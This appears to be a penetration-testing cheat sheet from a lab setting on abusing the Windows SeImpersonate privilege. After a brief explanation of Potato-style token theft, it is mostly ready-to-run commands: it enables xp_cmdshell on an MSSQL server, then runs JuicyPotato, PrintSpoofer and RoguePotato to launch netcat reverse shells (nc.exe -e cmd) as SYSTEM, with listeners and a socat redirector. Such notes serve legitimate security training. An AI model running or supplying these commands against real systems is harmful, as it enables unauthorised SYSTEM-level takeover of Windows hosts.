### Content

- [Overview](#overview)
- [SeImpersonate Abuse](#seimpersonate-abuse)
	- [Using JuicyPotato](#using-juicypotato)
	- [Using PrintSpoofer](#using-printspoofer)
	- [Using RoguePotato](#using-roguepotato)

> SeImpersonate ~= SeAssignPrimaryToken

---
#### Overview

- Every process has a token that has information about the account that is running it.
- These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory.
- To utilize the token, the `SeImpersonate` privilege is needed.

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

---
### SeImpersonate Abuse

Leverage SeImpersonate priv after gaining foothold on mssql server

``` bash
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

nt service\mssql$sqlexpress01
```

Checking Privileges:

``` bash
SQL> xp_cmdshell whoami /priv

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled      
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled      
```

We can leverage this by using JuicyPotato, PrintSpoofer and RoguePotato.

#### Using JuicyPotato

> JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.

Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

``` bash
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <LISTENER_IP> <LISTENER_PORT> -e cmd.exe" -t *
```

Catching SYSTEM Shell

```bash
$ sudo nc -lnvp 8443
```

#### Using PrintSpoofer

```bash
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <LISTENER_IP> <LISTENER_PORT> -e cmd"
```

Catching SYSTEM Shell

```bash
$ sudo nc -lnvp 8443
```

#### Using RoguePotato

start `socat` on the attack machine listening on TCP 135 and redirecting back to Remote on TCP 9999.

```bash
$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.129.43.30:9999
```

start `netcat` listener on the attack machine

```bash
$ sudo nc -lnvp 443
```

Execute RoguePotato on the victim machine

```bash
SQL> xp_cmdshell c:\tools\RoguePotato.exe -r <LISTENER_IP> -e "c:\tools\nc.exe <LISTENER_IP> <LISTENER_PORT> -e cmd" -l 9999
```

---
